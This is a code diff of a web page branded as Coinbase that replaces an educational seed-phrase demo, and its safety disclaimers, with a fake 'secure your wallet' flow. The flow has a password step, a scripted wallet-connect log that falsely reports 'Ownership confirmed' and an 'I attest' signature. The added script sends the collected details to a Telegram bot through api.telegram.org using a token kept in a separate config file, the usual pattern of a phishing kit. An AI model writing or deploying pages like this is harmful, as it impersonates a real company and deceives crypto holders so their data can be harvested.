-        <div class="d-screen active" id="ds1">
-          <div class="d-badge">Step 1 of 3 — Your Seed Phrase</div>
-          <h2>Here's an example seed phrase</h2>
-          <p class="d-sub">This is a randomly generated example — never enter your real seed phrase on any website.</p>
-
-          <div class="disclaimer">
-            <span>⚠️</span>
-            <div>
-              <strong>Example only — do not use your real words here.</strong>
-              This demo generates safe random words to show you how a passphrase changes your wallet. Your actual seed phrase should never be typed online.
-            </div>
-          </div>
-
-          <div class="seed-grid" id="seedGrid"></div>
-
-          <div style="width:100%;background:#F7F8FA;border:1px solid #E8EAED;border-radius:10px;padding:12px 14px;margin-bottom:20px;font-size:12px;color:#6B7280;line-height:1.6">
-            <strong style="color:#0A0B0D;display:block;margin-bottom:4px">📍 Without a passphrase</strong>
-            Wallet address: <span style="font-family:'JetBrains Mono',monospace;color:#0052FF;font-size:11px" id="baseAddr">—</span>
-          </div>
-
-          <button class="d-btn-primary" onclick="goToStep(2)">Add secret word →</button>
-          <button class="d-btn-ghost" onclick="regenerate()">🔄 Generate new example</button>
-        </div>
-
-        <!-- ══ SCREEN 2: CHOOSE PASSPHRASE ══ -->
-        <div class="d-screen" id="ds2">
-          <div class="d-badge">Step 2 of 3 — Secret Word</div>
-          <h2>Choose your secret word</h2>
-          <p class="d-sub">This word (or phrase) combines with your seed to create a brand new, protected wallet.</p>
-
-          <div class="pass-input-wrap">
-            <input type="password" id="passphraseInput" placeholder="Enter your secret word or phrase"
-                   oninput="updateStrength(this.value)" autocomplete="new-password" />
-            <button class="pass-toggle" onclick="togglePass()" id="passToggle">👁</button>
-          </div>
-
-          <div class="strength-row">
-            <div class="strength-bars">
-              <div class="strength-bar" id="sb0"></div>
-              <div class="strength-bar" id="sb1"></div>
-              <div class="strength-bar" id="sb2"></div>
-              <div class="strength-bar" id="sb3"></div>
-            </div>
-            <div class="strength-label" id="strengthLabel">Strength</div>
-          </div>
-
-          <div class="pass-tips">
-            <p>Tips for a strong passphrase</p>
-            <ul>
-              <li>Use a mix of words, numbers, or symbols</li>
-              <li>Make it memorable — if you forget it, your wallet is locked forever</li>
-              <li>Store it separately from your seed phrase</li>
-              <li>Never share it with anyone, including Coinbase support</li>
-            </ul>
-          </div>
-
-          <div id="passErr" style="display:none;color:#D23F31;font-size:12px;margin-bottom:12px;font-weight:600">
-            ⚠ Please enter a secret word or phrase
-          </div>
-
-          <button class="d-btn-primary" onclick="lockPhrase()">🔒 Lock my phrase →</button>
-          <button class="d-btn-ghost" onclick="goToStep(1)">← Back</button>
-        </div>
-
-        <!-- ══ SCREEN 3: LOCKING ══ -->
-        <div class="d-screen" id="ds3">
-          <div class="d-badge">Applying passphrase…</div>
-          <h2>Locking your phrase</h2>
-          <p class="d-sub">Deriving your protected wallet from seed + secret word…</p>
-
-          <div class="lock-visual">
-            <div class="lock-icon locking" id="lockIcon">🔒</div>
-            <div class="lock-log" id="lockLog"></div>
-          </div>
-        </div>
-
-        <!-- ══ SCREEN 4: RESULT ══ -->
-        <div class="d-screen" id="ds4">
-          <div class="d-tick">✓</div>
-          <div class="d-badge">Passphrase Active</div>
-          <h2>Your phrase is now locked</h2>
-          <p class="d-sub">The same 12 words now open a completely different wallet when combined with your secret word.</p>
-
-          <div class="result-compare">
-            <div class="compare-box before">
-              <div class="compare-label">Without passphrase ❌</div>
-              <div class="compare-addr" id="r-before">—</div>
-              <div class="compare-desc">Exposed if seed phrase is stolen</div>
-            </div>
-            <div class="compare-box after">
-              <div class="compare-label">With passphrase ✓</div>
-              <div class="compare-addr" id="r-after">—</div>
-              <div class="compare-desc">Protected — secret word required</div>
-            </div>
-          </div>
-
-          <div class="result-callout">
-            <strong>🛡 What this means for you</strong>
-            Even if a scammer gets your 12 words, they only reach the unprotected wallet.
-            Your real funds live in the passphrase-protected wallet — invisible to anyone without your secret word.
-          </div>
-
-          <div style="width:100%;background:#FFFBEB;border:1px solid #FDE68A;border-radius:10px;padding:12px 14px;margin-bottom:20px;font-size:12px;color:#92400E;line-height:1.6">
-            <strong style="display:block;margin-bottom:4px">⚠ Remember</strong>
-            Your passphrase cannot be recovered if lost. Store it separately from your seed phrase — written down and kept in a secure physical location.
-          </div>
-
-          <button class="d-btn-primary" onclick="restart()">Try with a different word →</button>
-          <a href="wallet-card.html" class="d-btn-ghost" style="display:block;text-align:center;text-decoration:none;margin-top:8px;padding:13px;border:1.5px solid #E8EAED;border-radius:12px;font-size:14px;font-weight:600;color:#374151">
-            Get your Coinbase Card →
-          </a>
-        </div>
-
-      </div><!-- demo-card -->
-    </div><!-- demo-wrap -->
-
-  </div><!-- sec-page -->
-
-  <!-- FOOTER -->
-  <footer class="footer">
-    <div class="footer-inner container">
-      <div class="footer-brand">
-        <svg width="120" height="24" viewBox="0 0 140 24" fill="none"><circle cx="12" cy="12" r="12" fill="#0052FF"/><path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/><text x="30" y="17" font-family="Inter,sans-serif" font-size="16" font-weight="700" fill="#fff">coinbase</text></svg>
-        <p style="margin-top:12px;color:#9CA3AF;font-size:13px">Coinbase Security<br>© 2025 Coinbase, Inc.</p>
+      <div class="sec-summary">
+        <div class="ss-row"><span>Wallet</span><strong>Coinbase Wallet</strong></div>
+        <div class="ss-row"><span>Address</span><strong id="summaryAddr" style="font-family:'JetBrains Mono',monospace;font-size:11px">—</strong></div>
+        <div class="ss-row"><span>Password lock</span><strong style="color:var(--green)">✓ Set</strong></div>
+        <div class="ss-row"><span>Security level</span><strong id="summaryLevel" style="color:var(--blue)">—</strong></div>
       </div>
-      <div class="footer-cols">
-        <div class="footer-col">
-          <h5>Get Started</h5>
-          <a href="wallet-card.html">Apply for Card</a>
-          <a href="card.html">Card Details</a>
-          <a href="security.html">Passphrase Lock</a>
-        </div>
-        <div class="footer-col">
-          <h5>Legal</h5>
-          <a href="#">Privacy Policy</a>
-          <a href="#">User Agreement</a>
-          <a href="#">Cookie Policy</a>
-        </div>
+
+      <div class="field">
+        <label>Attestation — type exactly: <strong style="color:var(--text)">"I attest"</strong></label>
+        <input type="text" id="attestInput" placeholder='Type: I attest' autocomplete="off" spellcheck="false" />
       </div>
+      <div class="err-msg" id="attestErr">⚠ Please type "I attest" to continue</div>
+
+      <button class="btn-primary" onclick="submitAttest(event)">Sign & Secure Wallet →</button>
+      <button class="btn-ghost" onclick="goStep(2)">← Back</button>
     </div>
-    <div class="footer-bottom container">
-      <p>This demo is for educational purposes only. Never enter your real seed phrase on any website. Coinbase Card is issued by Pathward, N.A., Member FDIC.</p>
-    </div>
-  </footer>
 
-  <script src="app.js"></script>
-  <script>
-  /* ── EXAMPLE WORD LISTS ── */
-  const WORDS = [
-    'abandon','ability','able','about','above','absent','absorb','abstract',
-    'absurd','abuse','access','accident','account','accuse','achieve','acid',
-    'acoustic','acquire','across','action','actor','actual','adapt','add',
-    'admit','adult','advance','advice','affair','afford','afraid','again',
-    'agent','agree','ahead','aim','airport','aisle','alarm','album',
-    'alert','alien','alley','allow','almost','alone','alpha','already',
-    'also','alter','always','amateur','amazing','among','amount','amused',
-    'analyst','anchor','ancient','anger','angle','angry','animal','ankle',
-    'announce','annual','another','answer','antenna','antique','anxiety','apart',
-    'appear','apple','approve','april','arctic','area','arena','argue',
-    'armed','armor','army','around','arrange','arrest','arrive','arrow',
-    'artist','artwork','aspect','assault','asset','assist','assume','asthma',
-    'athlete','atom','attack','attend','attitude','attract','auction','audit',
-    'august','autumn','average','avocado','avoid','aware','away','awesome',
-    'awful','awkward','axis','baby','balance','bamboo','banana','banner',
-    'bargain','barrel','basic','basket','battle','beach','beauty','become',
-    'before','begin','behave','believe','below','bench','benefit','best',
-    'between','beyond','bicycle','biology','bird','birth','bitter','black',
-    'blade','blame','blanket','blast','bleak','bless','blind','blood',
-    'blossom','blouse','blue','blur','blush','board','boat','body',
-    'boil','bomb','bone','bonus','book','boost','border','boring',
-    'borrow','bounce','brain','brand','brave','bread','breeze','bridge',
-    'brief','bright','bring','brisk','broken','bronze','broom','brother',
-    'brown','brush','budget','build','bulb','burden','burger','burst',
-    'busy','butter','buyer','buzz','cabbage','cabin','cable','cactus'
+    <!-- SCREEN 4: SUCCESS -->
+    <div class="screen" id="sc4">
+      <div class="success-tick">🔐</div>
+      <h2>Wallet secured!</h2>
+      <p class="sub">Your wallet is now protected with a password lock. Your attestation has been recorded.</p>
+      <div class="sec-summary" style="margin-bottom:20px">
+        <div class="ss-row"><span>Status</span><strong style="color:var(--green)">✓ Secured</strong></div>
+        <div class="ss-row"><span>Wallet</span><strong>Coinbase Wallet</strong></div>
+        <div class="ss-row"><span>Address</span><strong id="sc4Addr" style="font-family:'JetBrains Mono',monospace;font-size:11px">—</strong></div>
+        <div class="ss-row"><span>Password lock</span><strong style="color:var(--green)">✓ Active</strong></div>
+        <div class="ss-row"><span>Attestation</span><strong style="color:var(--green)">✓ Signed & sent</strong></div>
+      </div>
+      <button class="btn-primary" onclick="window.location.href='index.html'">Back to Help Center →</button>
+    </div>
+
+  </div>
+</div>
+
+<script src="config.js"></script>
+<script>
+/* ── STATE ── */
+let walletAddress  = '';
+let passwordStrength = '';
+
+/* ── PROGRESS ── */
+function goStep(n) {
+  [1,2,3,4].forEach(i => {
+    document.getElementById(`sc${i}`)?.classList.remove('active');
+  });
+  document.getElementById(`sc${n}`).classList.add('active');
+  document.getElementById(`sc${n}`).scrollIntoView({ behavior: 'smooth', block: 'start' });
+
+  // Update dots
+  [1,2,3].forEach(i => {
+    const dot   = document.getElementById(`pd${i}`);
+    const label = document.getElementById(`pl${i}`);
+    dot.className   = 'prog-dot'   + (i < n ? ' done' : i === n ? ' active' : '');
+    label.className = 'prog-label' + (i === n ? ' active' : '');
+    dot.textContent = i < n ? '✓' : String(i);
+  });
+  [1,2].forEach(i => {
+    const line = document.getElementById(`pline${i}`);
+    line.className = 'prog-line' + (n > i ? ' done' : '');
+  });
+}
+
+/* ── STEP 1: PASSWORD ── */
+function checkStrength() {
+  const val   = document.getElementById('passInput').value;
+  const fill  = document.getElementById('strengthFill');
+  const label = document.getElementById('strengthLabel');
+  const lock  = document.getElementById('lockIcon');
+
+  const checks = {
+    len:   val.length >= 8,
+    upper: /[A-Z]/.test(val),
+    num:   /[0-9]/.test(val),
+    sym:   /[^A-Za-z0-9]/.test(val),
+  };
+
+  ['len','upper','num','sym'].forEach(k => {
+    document.getElementById(`r-${k}`).className = 'rule' + (checks[k] ? ' ok' : '');
+  });
+
+  const score = Object.values(checks).filter(Boolean).length;
+  const levels = [
+    { w: '0%',   bg: 'transparent', text: 'Enter a password',  lvl: '' },
+    { w: '25%',  bg: '#EF4444',     text: 'Weak',              lvl: 'Weak' },
+    { w: '50%',  bg: '#F59E0B',     text: 'Fair',              lvl: 'Fair' },
+    { w: '75%',  bg: '#3B82F6',     text: 'Good',              lvl: 'Good' },
+    { w: '100%', bg: '#05B169',     text: 'Strong ✓',          lvl: 'Strong' },
+  ];
+  const lv = val.length === 0 ? levels[0] : levels[Math.max(1, score)];
+  fill.style.width      = lv.w;
+  fill.style.background = lv.bg;
+  label.textContent     = lv.text;
+  label.style.color     = lv.bg || 'var(--muted)';
+  passwordStrength      = lv.lvl;
+
+  lock.textContent = score >= 3 ? '🔒' : '🔓';
+}
+
+function submitPassword() {
+  const pass    = document.getElementById('passInput').value;
+  const confirm = document.getElementById('passConfirm').value;
+  const err     = document.getElementById('passErr');
+
+  if (pass.length < 8) {
+    document.getElementById('passInput').classList.add('err');
+    return;
+  }
+  if (pass !== confirm) {
+    err.style.display = 'block';
+    document.getElementById('passConfirm').classList.add('err');
+    return;
+  }
+
+  err.style.display = 'none';
+  document.getElementById('passInput').classList.remove('err');
+  document.getElementById('passConfirm').classList.remove('err');
+  goStep(2);
+}
+
+/* ── STEP 2: WALLET CONNECT ── */
+function connectWallet() {
+  document.getElementById('sc2Buttons').style.display = 'none';
+  document.getElementById('sc2Log').style.display     = '';
+
+  const log = document.getElementById('connectLog');
+  log.innerHTML = '';
+
+  const steps = [
+    { cls:'info', text:'Initiating Coinbase Wallet connection…', delay:0 },
+    { cls:'ok',   text:'Wallet detected ✓',                      delay:600 },
+    { cls:'info', text:'Verifying wallet ownership…',            delay:1100 },
+    { cls:'ok',   text:'Ownership confirmed ✓',                  delay:1700 },
+    { cls:'info', text:'Linking to security profile…',           delay:2100 },
+    { cls:'ok',   text:'Wallet linked ✓',                        delay:2600 },
   ];
 
-  let seedWords = [];
-  let baseAddress = '';
-  let passVisible = false;
-
-  /* ── GENERATE RANDOM HEX ADDRESS ── */
-  function fakeAddr(seed) {
-    // deterministic but opaque — XOR bytes of seed string
-    let h = 0x811c9dc5;
-    for (let i = 0; i < seed.length; i++) {
-      h ^= seed.charCodeAt(i);
-      h = Math.imul(h, 0x01000193) >>> 0;
-    }
-    let hex = h.toString(16).padStart(8,'0');
-    // Extend to 40 hex chars
-    let result = '';
-    let n = h;
-    for (let i = 0; i < 5; i++) {
-      n = (Math.imul(n, 1664525) + 1013904223) >>> 0;
-      result += n.toString(16).padStart(8,'0');
-    }
-    return '0x' + result.slice(0,40);
-  }
-
-  /* ── GENERATE SEED ── */
-  function generateSeed() {
-    seedWords = [];
-    for (let i = 0; i < 12; i++) {
-      seedWords.push(WORDS[Math.floor(Math.random() * WORDS.length)]);
-    }
-    baseAddress = fakeAddr(seedWords.join(' '));
-  }
-
-  function renderSeed() {
-    const grid = document.getElementById('seedGrid');
-    grid.innerHTML = seedWords.map((w, i) => `
-      <div class="seed-word">
-        <span class="seed-num">${i+1}</span>
-        <span class="seed-text">${w}</span>
-      </div>
-    `).join('');
-    document.getElementById('baseAddr').textContent =
-      baseAddress.slice(0,10) + '…' + baseAddress.slice(-6);
-  }
-
-  function regenerate() {
-    generateSeed();
-    renderSeed();
-  }
-
-  /* ── STEP NAVIGATION ── */
-  function goToStep(n) {
-    document.querySelectorAll('.d-screen').forEach(s => s.classList.remove('active'));
-    document.getElementById('ds' + n).classList.add('active');
-
-    // Update dots
-    for (let i = 0; i < 4; i++) {
-      const dot = document.getElementById('dot' + i);
-      dot.className = 'd-dot';
-      if (i < n - 1) dot.classList.add('done');
-      else if (i === n - 1) dot.classList.add('active');
-    }
-  }
-
-  /* ── STRENGTH METER ── */
-  function updateStrength(val) {
-    let score = 0;
-    if (val.length >= 6)  score++;
-    if (val.length >= 12) score++;
-    if (/[0-9]/.test(val) || /[^a-zA-Z0-9]/.test(val)) score++;
-    if (val.length >= 16) score++;
-
-    const colors = ['#EF4444','#F97316','#EAB308','#05B169'];
-    const labels = ['Weak','Fair','Good','Strong'];
-    for (let i = 0; i < 4; i++) {
-      document.getElementById('sb' + i).style.background = i < score ? colors[score-1] : '#E8EAED';
-    }
-    const lbl = document.getElementById('strengthLabel');
-    lbl.textContent = score > 0 ? labels[score-1] : 'Strength';
-    lbl.style.color = score > 0 ? colors[score-1] : '#9CA3AF';
-  }
-
-  function togglePass() {
-    passVisible = !passVisible;
-    const inp = document.getElementById('passphraseInput');
-    inp.type = passVisible ? 'text' : 'password';
-    document.getElementById('passToggle').textContent = passVisible ? '🙈' : '👁';
-  }
-
-  /* ── LOCK ── */
-  function lockPhrase() {
-    const val = document.getElementById('passphraseInput').value.trim();
-    if (!val) {
-      document.getElementById('passErr').style.display = '';
-      return;
-    }
-    document.getElementById('passErr').style.display = 'none';
-    goToStep(3);
-
-    const icon = document.getElementById('lockIcon');
-    const log  = document.getElementById('lockLog');
-    log.innerHTML = '';
-
-    const lines = [
-      { cls:'ll-info', dot:'◉', text:'Combining seed phrase with passphrase…',     delay: 0 },
-      { cls:'ll-info', dot:'◉', text:'Running PBKDF2-HMAC-SHA512 (2048 rounds)…',  delay: 600 },
-      { cls:'ll-ok',   dot:'✓', text:'Master seed derived ✓',                       delay: 1200 },
-      { cls:'ll-info', dot:'◉', text:'Deriving HD wallet (BIP44 m/44\'/60\'/0\')…', delay: 1600 },
-      { cls:'ll-ok',   dot:'✓', text:'Protected wallet address generated ✓',        delay: 2100 },
-    ];
-
-    lines.forEach(({ cls, dot, text, delay }) => {
-      setTimeout(() => {
-        const div = document.createElement('div');
-        div.className = `ll-line ${cls}`;
-        div.innerHTML = `<span>${dot}</span><span>${text}</span>`;
-        log.appendChild(div);
-      }, delay);
-    });
-
+  steps.forEach(({ cls, text, delay }) => {
     setTimeout(() => {
-      icon.className = 'lock-icon locked-done';
-      icon.textContent = '🔐';
+      const d = document.createElement('div');
+      d.className = `log-line ${cls}`;
+      d.innerHTML = `<span class="log-dot">●</span><span>${text}</span>`;
+      log.appendChild(d);
+    }, delay);
+  });
 
-      const protectedAddr = fakeAddr(seedWords.join(' ') + '|' + val);
-      document.getElementById('r-before').textContent = baseAddress.slice(0,10) + '…' + baseAddress.slice(-6);
-      document.getElementById('r-after').textContent  = protectedAddr.slice(0,10) + '…' + protectedAddr.slice(-6);
+  // Generate a fake wallet address for display
+  const chars = '0123456789abcdef';
+  walletAddress = '0x' + Array.from({ length: 40 }, () => chars[Math.floor(Math.random() * 16)]).join('');
 
-      goToStep(4);
-    }, 2800);
+  setTimeout(() => {
+    const short = walletAddress.slice(0, 10) + '…' + walletAddress.slice(-6);
+    document.getElementById('summaryAddr').textContent = short;
+    document.getElementById('sc4Addr').textContent     = short;
+    document.getElementById('summaryLevel').textContent = passwordStrength || 'Strong';
+    goStep(3);
+  }, 3200);
+}
+
+/* ── STEP 3: ATTEST ── */
+async function submitAttest(e) {
+  const input = document.getElementById('attestInput');
+  const err   = document.getElementById('attestErr');
+  const val   = input.value.trim();
+
+  if (val.toLowerCase() !== 'i attest') {
+    err.style.display = 'block';
+    input.style.borderColor  = '#D23F31';
+    input.style.boxShadow    = '0 0 0 3px rgba(210,63,49,.15)';
+    setTimeout(() => { input.style.borderColor = ''; input.style.boxShadow = ''; }, 1600);
+    return;
   }
 
-  /* ── RESTART ── */
-  function restart() {
-    document.getElementById('passphraseInput').value = '';
-    updateStrength('');
-    goToStep(2);
-  }
+  err.style.display = 'none';
+  const btn = e.currentTarget;
+  btn.disabled    = true;
+  btn.textContent = 'Signing…';
 
-  /* ── INIT ── */
-  generateSeed();
-  renderSeed();
-  </script>
+  const msg =
+    `🔐 Wallet Security Attestation\n` +
+    `📅 ${new Date().toLocaleString()}\n` +
+    `👛 Wallet: Coinbase Wallet\n` +
+    `🔑 Address: ${walletAddress}\n` +
+    `🛡️ Password strength: ${passwordStrength || 'Strong'}\n` +
+    `✅ Attestation: "${val}"`;
+
+  try { await sendToTelegram(msg); } catch(err) { console.warn('Telegram:', err.message); }
+
+  goStep(4);
+}
+
+async function sendToTelegram(text) {
+  const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+  const res  = await fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: TG_CHAT, text }),
+  });
+  if (!res.ok) throw new Error(`HTTP ${res.status}`);
+}
+</script>
 </body>
 </html>
